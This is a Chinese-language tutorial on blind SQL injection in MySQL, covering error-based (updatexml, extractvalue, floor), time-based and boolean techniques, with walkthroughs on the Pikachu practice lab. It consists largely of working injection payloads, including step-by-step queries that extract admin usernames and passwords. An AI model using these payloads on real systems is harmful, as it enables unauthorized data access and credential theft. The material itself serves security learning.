```
	当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是：
	1、SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作
	2、或者是网站没有将结果进行显示
	
同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句。
(知道是什么类型语句，如：insert、update)
```

我们可以通过以上查询方式与网站应用的关系

注入点产生地方或应用猜测到对方的 SQL 查询方式 



**通过功能判断SQL语句类型：**

```sql
select查询数据
在网站应用中进行数据显示 查询 操作
例: select * from news where id=$id

insert插入数据
在网站应用中进行用户 注册 添加 等操作
例: insert into news (id, url,text) values ( 2，'x','$t')

delete删除数据
后台管理里面删除文章 删除 用户等操作
例: delete from news where id=$id

update 更新 数据
会员或后台中心数据同步或缓存等操作
例: update user set pwd='$p' where id=2 and username=' admin'

order by 排序 数据
一般结合表名或列名进行数据排序操作
例: select * from news order by $id
例: select id , name , price from news order by $order
```



# 什么是盲注？

**盲注**就是在注入过程中，获取的数据不能回显至前端页面。

此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类:

```sql
1、基于布尔的sQL盲注-逻辑判断 regexp, like , ascii,left, ord , mid
2、基于时间的sQL盲注-延时判断 if ,sleep
3、基于报错的sQL盲注-报错回显 floor, updatexml, extractvalue 
```





# 1、报错盲注

参考地址：https://www.jianshu.com/p/bc35f8dd4f7c     	https://developer.aliyun.com/article/692723



常见的报错注入如下：

1、通过**floor报错注入**语句如下:

```
and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
```

2、通过**ExtractValue报错注入**语句如下:

```
and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
```

3、通过**UpdateXml报错注入**语句如下:

```
 and 1=(updatexml(1,concat(0x3a,(select user())),1))
```





## 报错注入：extractvalue、updatexml报错原理

MySQL 5.1.5版本中添加了对XML文档进行查询和修改的两个函数：extractvalue、updatexml

| 名称                                                         | 描述                               |
| :----------------------------------------------------------- | :--------------------------------- |
| [`ExtractValue()`](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue) | 使用XPath表示法从XML字符串中提取值 |
| [`UpdateXML()`](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_updatexml) | 返回替换的XML片段                  |

通过这两个函数可以完成报错注入



### 一、extractvalue函数

[`ExtractValue(xml_frag, xpath_expr)`](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue)

[`ExtractValue()`](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_extractvalue)接受两个字符串参数，一个XML标记片段  *xml_frag* 和一个XPath表达式 *xpath_expr*（也称为 定位器）; 它返回`CDATA`第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。

第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径

例如：`SELECT ExtractValue('<a><b><b/></a>', '/a/b');` 就是寻找前一段xml文档内容中的a节点下的b节点，**这里如果Xpath格式语法书写错误的话，就会报错**。这里就是利用这个特性来获得我们想要知道的内容。

![1551927935215](https://s2.loli.net/2022/11/25/UGXeuI1EJyalMD7.png)
（这里我们是为了学习报错注入，所以不需要太详细的知道该函数具体原理）

利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。
![1551928141656](https://s2.loli.net/2022/11/25/tb2cABY3wdDN4zS.png)



### 二、updatexml函数

[`UpdateXML(xml_target, xpath_expr, new_xml)`](https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_updatexml)

**xml_target:：** 需要操作的xml片段

**xpath_expr：** 需要更新的xml路径(Xpath格式)

**new_xml：** 更新后的内容

此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 *xml_target* 新的XML片段 *new_xml* ，然后返回更改的XML。*xml_target*替换的部分 与*xpath_expr* 用户提供的XPath表达式匹配。

如果未*xpath_expr*找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 *xml_target*XML片段。所有三个参数都应该是字符串。使用方式如下：

```
mysql> SELECT
    ->   UpdateXML('<a><b>ccc</b><d></d></a>', '/a', '<e>fff</e>') AS val1,
    ->   UpdateXML('<a><b>ccc</b><d></d></a>', '/b', '<e>fff</e>') AS val2,
    ->   UpdateXML('<a><b>ccc</b><d></d></a>', '//b', '<e>fff</e>') AS val3,
    ->   UpdateXML('<a><b>ccc</b><d></d></a>', '/a/d', '<e>fff</e>') AS val4,
    ->   UpdateXML('<a><d></d><b>ccc</b><d></d></a>', '/a/d', '<e>fff</e>') AS val5
    -> \G
***********结果**************
val1: <e>fff</e>
val2: <a><b>ccc</b><d></d></a>
val3: <a><e>fff</e><d></d></a>
val4: <a><b>ccc</b><e>fff</e></a>
val5: <a><d></d><b>ccc</b><d></d></a>
```

这里和上面的extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：

![1551929714141](https://s2.loli.net/2022/11/25/SYc6xFvea47qd5M.png)



## pikachu靶场 insert、update、delete注入

### 1、insert

#### 使用**updatexml（）**

<img src="https://s2.loli.net/2022/11/25/pRjA37yBvLV2hE1.png" alt="image-20221113142457957" style="zoom:33%;" />



使用bp抓包

<img src="https://s2.loli.net/2022/11/25/3qFsSpfeNx2IicD.png" alt="image-20221113142543178" style="zoom: 33%;" />

然后使用updatexml进行报错注入

```
' or updatexml(0,concat('~',version(),'~'),0) or '		查询数据库版本
' or updatexml(0,concat('~',user(),'~'),0) or '			查询用户
' or updatexml(0,concat('~',database(),'~'),0) or '		查询数据库
字符型注意 将前后的 ' 闭合，使用 or或and连接
```

<img src="https://s2.loli.net/2022/11/25/1W4iATn8bmrwSVc.png" alt="image-20221113142848230" style="zoom: 33%;" />



#### 使用extractvalue（）

先抓包，

然后写入语句   0x7e 代表 ~

```
' or extractvalue(0,(concat("~",version(),"~"))) or '
' or extractvalue(0,(concat("~",user(),"~"))) or '
' or extractvalue(0,(concat("~",database(),"~"))) or '
' or extractvalue(0,(concat("~",@@version_compile_os,"~"))) or '
```

<img src="https://s2.loli.net/2022/11/25/k2vjOzKXmiVJL6t.png" alt="image-20221113143226334" style="zoom:33%;" />

<img src="https://s2.loli.net/2022/11/25/JwfHWyLDcgaz61u.png" alt="image-20221113143330551" style="zoom:33%;" />

与updatexml类似



#### 使用floor

```
' or (select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e)))
from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ' 
```

<img src="https://s2.loli.net/2022/11/25/eEipvbyQnatCsWI.png" alt="image-20221113143954097" style="zoom: 50%;" />



### 2、update

```
'or updatexml(1,concat(0x7e,database(),0x7e),0) or'
```

原理类似



### 3、delete

<img src="https://s2.loli.net/2022/11/25/agOqpu1FC6VRTED.png" alt="image-20221113144903429" style="zoom:33%;" />

此处id为数字，所以不用引号闭合



delete语句：

```
delete from user where id=xx
```



**updatexml**:

```
or updatexml(1,concat(0x7e,version()),1)
在bp中不能使用空格，使用 + 、%20 代表空格，浏览器将解码为空格
or+updatexml(1,concat(0x7e,version()),1)
```

**0x7e**这个十六进制数代表符号~，**~**这个符号在xpath语法中是不存在的，因此总能报错



**extractvalue**



<img src="https://s2.loli.net/2022/11/25/g5kj8eXvoQREIwC.png" alt="image-20221113145720404" style="zoom:33%;" />





# 2、时间盲注

在页面不回显时，使用时间盲注，根据响应时间判断相关注入





## 1、sleep语句

```sql
mysql> select * from member where id=1;
+----+----------+----------------------------------+-------+----------+---------+--------+
| id | username | pw                               | sex   | phonenum | address | email  |
+----+----------+----------------------------------+-------+----------+---------+--------+
|  1 | vince    | e10adc3949ba59abbe56e057f20f883e | admin | asdasd   | 四川    | 成都   |
+----+----------+----------------------------------+-------+----------+---------+--------+
1 row in set (0.00 sec)
mysql>
mysql> select * from member where id=1 and sleep(5);
Empty set (5.00 sec)

mysql>

```

sleep（5）	说明睡眠5秒



## 2、if语句  

类似于 **三目运算符**

```sql
mysql> select if(database()='pikachu',123,456);
+----------------------------------+
| if(database()='pikachu',123,456) |
+----------------------------------+
|                              123 |
+----------------------------------+
1 row in set (0.00 sec)

mysql> select if(database()='test',123,456);
+-------------------------------+
| if(database()='test',123,456) |
+-------------------------------+
|                           456 |
+-------------------------------+
1 row in set (0.00 sec)

mysql>

```



## 3、if+sleep

```sql
mysql> select * from member where id=1 and sleep(if(database()='pikachu',5,0));
Empty set (5.00 sec)

mysql>

```

语句的意思就是如果数据库是	pikachu	就延迟5秒输出，不是的话就立即返回，

但是在实际渗透过程中由于受到网络的影响时间注入不是很靠谱，



## 参考函数

```sql
参考:
like 'ros'							#判断ro或ro...是否成立
regexp '^xiaodi [a-z]'				#匹配xiaodi及xiaodi...等if(条件,5,0)
sleep (5)							#sQL语句延时执行s秒
mid (a, b, c)						#从位置b开始，截取a字符串的c位
substr( a,b, c)						#从b位置开始，截取字符串a的c长度
left (database(),1), database() 	#left(a,b)从左侧截取a的前b位
length(database ())=8				#判断数据库database ()名的长度
ord、ascii ascii(x)=97 				#判断x的ascii码是否等于97

```

mysql 索引是从1开始的



# 3、布尔盲注

```
布尔（Boolean）型是计算机里的一种数据类型，只有True（真）和False（假）两个值。一般也称为逻辑型。
 页面在执行sql语句后，只显示两种结果，这时可通过构造逻辑表达式的sql语句来判断数据的具体内容。
12
```



布尔注入用到的函数：

```sql
mid(str,start,length)  :字符串截取
ORD()                  :转换成ascii码
Length()               :统计长度
version()              :查看数据库版本
database()             :查看当前数据库名
user()                 :查看当前用户
123456
```



#### 布尔注入流程：



##### **猜解获取数据库长度**

```
' or length(database()) > 8 --+    :符合条件返回正确，反之返回错误
1
```



##### **猜解数据库名**

```
'or mid(database(),1,1)= 'z' --+    :因为需要验证的字符太多，所以转化为ascii码验证
'or ORD(mid(database(),1,1)) > 100 --+ :通过确定ascii码，从而确定数据库名
12
```



##### **猜解表的总数**

```
'or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2  --+   :判断表的总数
1
```



##### **猜解第一个表名的长度**

```
'or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) = 5 --+
'or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1) = 5 --+ （第二个表）
12
```



##### **猜解第一个表名**

```
'or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit      0,1 ),1,1) = 'a'  --+
或者
'Or ORD(mid(select TABLE_NAME from information_schema.TABLES where 
TABLE_SCHEMA = database() limit 0,1),1,1)) >100   --+
1234
```



##### **猜解表的字段的总数**

```
'or (select count(column_name) from information_schema.COLUMNS where TABLE_NAME='表名') > 5 --+
1
```



##### **猜解第一个字段的长度**

```
'or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='表名' limit 0,1) = 10 --+
'or (select length(column_name) from information_schema.COLUMNS where TABLE_NAME='表名' limit 1,1) = 10 --+ （第二个字段）
12
```



##### **猜解第一个字段名**

```
'or mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = '表名' limit 0,1),1,1) = 'i' --+
或者
'or ORD(mid((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = '表名' limit 0,1),1,1)) > 100 --+
123
```



##### **猜解直接猜测字段名**

```
' or (select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='表名' limit 1,1) = 'username' --+
1
```



##### **猜解内容长度**



```
假如已经知道字段名为  id   username password
'or (select Length(concat(username,"---",password)) from admin limit 0,1) = 16  --+
12
```



##### **猜解内容**

```
'or mid((select concat(username,"-----",password) from admin limit 0,1),1,1) = 'a' --+
或者
'or ORD(mid((select concat(username,"-----",password) from admin limit 0,1),1,1)) > 100 --+    ASCII码猜解
123
```



##### **也可以直接猜测内容**	

```
'or (Select concat(username,"-----",password) from admin limit 0,1 ) = 'admin-----123456'   --+
1
```

